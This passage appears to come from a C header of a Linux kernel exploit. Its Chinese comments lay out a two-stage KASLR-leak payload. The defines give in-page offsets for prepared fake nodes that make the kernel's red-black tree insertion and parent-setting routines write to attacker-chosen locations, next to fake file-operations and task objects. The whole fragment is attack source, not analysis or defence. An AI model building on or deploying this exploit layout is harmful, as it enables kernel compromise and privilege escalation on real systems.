...
#define PFEM10_PAYLOAD_LEAK  2   /* KASLR 泄漏两段式 (run_leak): SLIDE 全套 + Stage-2 graft 节点 */

/* Stage-2 (Case 3) 页内预置节点 (payload_base 相对, 8 对齐, 与 FOPS 0x1000/TASK 0x3200/
 * RIGHT 0x4440 等既有对象互不重叠):
 *   P0  (+0x00 pc←内核写 S2, 预置 0; +0x08 =0; +0x10 = alias(MB)−0x10 = S1)
 *   PC  (+0x00 = 1 → rb_insert_color 视父黑立即 break; +0x08/+0x10 ← change_child 落点)
 *   GAP (+0x00 ← rb_set_parent 读改写 in[2]) */
#define PFEM10_PAYLOAD_LEAK_P0_OFF   0x4100
#define PFEM10_PAYLOAD_LEAK_PC_OFF   0x4120
#define PFEM10_PAYLOAD_LEAK_GAP_OFF  0x4180
